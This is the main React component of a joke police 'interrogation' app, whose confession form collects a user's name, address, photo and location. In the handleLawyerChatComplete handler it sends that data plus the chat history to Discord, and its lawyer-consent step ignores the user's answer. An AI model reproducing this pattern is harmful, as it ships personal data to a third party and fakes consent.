import { useState, useEffect } from 'react';
import { ConfessionForm } from './components/ConfessionForm';
import { ChatContainer } from './components/ChatContainer';
import { WantedPoster } from './components/WantedPoster';
import { LawyerConsent } from './components/LawyerConsent';
import { LawyerChat } from './components/LawyerChat';
import { CrimesModal } from './components/CrimesModal';
import { StatusMessage } from './components/StatusMessage';
import { sendCompleteConfessionToDiscord } from './utils/discord';
import { APP_NAME, DEPARTMENT_NAME, APP_VERSION, CREATOR_NAME } from './config';

export interface ConfessionData {
  name: string;
  address: string;
  crime: string;
  photo?: string;
  location?: { lat: number; lng: number };
  chatHistory?: Array<{ role: string; content: string }>;
}

export interface StatusInfo {
  message: string;
  type: 'info' | 'success' | 'error' | 'warning';
}

export default function App() {
  const [status, setStatus] = useState<StatusInfo | null>(null);
  const [showPoster, setShowPoster] = useState(false);
  const [showLawyerConsent, setShowLawyerConsent] = useState(false);
  const [showLawyerChat, setShowLawyerChat] = useState(false);
  const [showCrimes, setShowCrimes] = useState(false);
  const [confessionData, setConfessionData] = useState<ConfessionData | null>(null);
  const [chatActive, setChatActive] = useState(false);
  const [chatMode, setChatMode] = useState<'officer' | 'representative'>('officer');

  useEffect(() => {
    if (status) {
      const timer = setTimeout(() => setStatus(null), 5000);
      return () => clearTimeout(timer);
    }
  }, [status]);

  const handleConfessionSubmit = (data: ConfessionData) => {
    setConfessionData(data);
    setShowPoster(true);
    setStatus({ message: '✓ Confession received and uploaded to records!', type: 'success' });
  };

  const handlePosterClose = () => {
    setShowPoster(false);
    setShowLawyerConsent(true);
  };

  const handleLawyerAccept = (accepted: boolean) => {
    setShowLawyerConsent(false);
    setShowLawyerChat(true);
  };

  const handleLawyerChatComplete = (chatHistory: Array<{ role: string; content: string }>) => {
    // Send complete confession with chat history to Discord
    if (confessionData) {
      const completeData = {
        ...confessionData,
        chatHistory,
      };
      sendCompleteConfessionToDiscord(completeData);
    }
  };

  const handleDenialSubmit = () => {
    setChatActive(true);
    setChatMode('officer');
    setStatus({ message: 'Recording your denial...', type: 'warning' });
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-[#0a0a0a] via-[#0f0f0f] to-[#1a1a1a] text-[#e0e0e0] flex items-center justify-center px-4 py-6 md:py-10">
      <div className="w-full max-w-3xl">
        {/* Header */}
        <header className="text-center mb-10 md:mb-14 pb-8 md:pb-10 border-b-2 border-[#2196F3]/30">
          <div className="text-3xl md:text-4xl lg:text-5xl mb-3 flex items-center justify-center gap-3" style={{ fontWeight: 700, color: '#2196F3', letterSpacing: '-0.5px' }}>
            <span>🚔</span>
            <span>{APP_NAME}</span>
            <span>🚔</span>
          </div>
          <div className="text-base md:text-lg text-[#aaa] mb-5 md:mb-6">{DEPARTMENT_NAME}</div>
          <span className="inline-block bg-[#1a1a1a] border border-[#2196F3]/40 px-4 py-2 rounded-full text-xs md:text-sm shadow-lg shadow-[#2196F3]/10" style={{ fontWeight: 500, color: '#2196F3' }}>
            INTERROGATION SYSTEM {APP_VERSION}
          </span>
        </header>

        {/* Status Message */}
        {status && <StatusMessage message={status.message} type={status.type} />}

        {/* Main Content */}
        <div className="bg-gradient-to-br from-[#1a1a1a] to-[#151515] border border-[#333] rounded-xl p-6 md:p-10 mb-8 md:mb-10 shadow-2xl shadow-black/50">
          <ConfessionForm
            onConfessionSubmit={handleConfessionSubmit}
            onDenialSubmit={handleDenialSubmit}
            onStatusChange={setStatus}
            onViewCrimes={() => setShowCrimes(true)}
          />
        </div>

        {/* Chat Container */}
        {chatActive && (
          <ChatContainer
            mode={chatMode}
            suspectName={confessionData?.name}
            onStatusChange={setStatus}
          />
        )}

        {/* Footer */}
        <footer className="text-center mt-16 md:mt-20 pt-8 md:pt-10 border-t-2 border-[#2196F3]/30 text-sm text-[#aaa]">
          <p className="mb-2">
            Made by <span style={{ fontWeight: 600, color: '#2196F3' }}>{CREATOR_NAME}</span>
          </p>
          <p className="text-xs text-[#666]">© 2025 {DEPARTMENT_NAME}. All rights reserved.</p>
        </footer>
      </div>

      {/* Modals */}
      {showPoster && confessionData && (
        <WantedPoster
          data={confessionData}
          onClose={handlePosterClose}
        />
      )}

      {showLawyerConsent && (
        <LawyerConsent
          onAccept={handleLawyerAccept}
        />
      )}

      {showLawyerChat && confessionData && (
        <LawyerChat
          suspectName={confessionData.name}
          onClose={() => setShowLawyerChat(false)}
          onStatusChange={setStatus}
          onChatComplete={handleLawyerChatComplete}
        />
      )}

      {showCrimes && (
        <CrimesModal
          onClose={() => setShowCrimes(false)}
          onStatusChange={setStatus}
        />
      )}
    </div>
  );
}